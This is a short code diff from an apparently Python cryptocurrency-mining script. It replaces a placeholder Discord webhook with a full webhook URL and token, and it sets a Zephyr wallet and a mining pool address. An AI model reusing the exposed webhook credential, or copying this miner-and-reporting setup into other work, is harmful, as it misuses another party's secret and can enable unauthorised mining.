@@ -8,7 +8,7 @@ import json
 import tarfile
 from urllib.request import urlretrieve
 
-WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"  # 🔁 Replace with your real Discord webhook
+WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # 🔁 Replace with your real Discord webhook
 WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker001"  # 🔁 Replace with your real Monero wallet
 POOL = "fr.zephyr.herominers.com:1123"  # You can customize this if needed
 
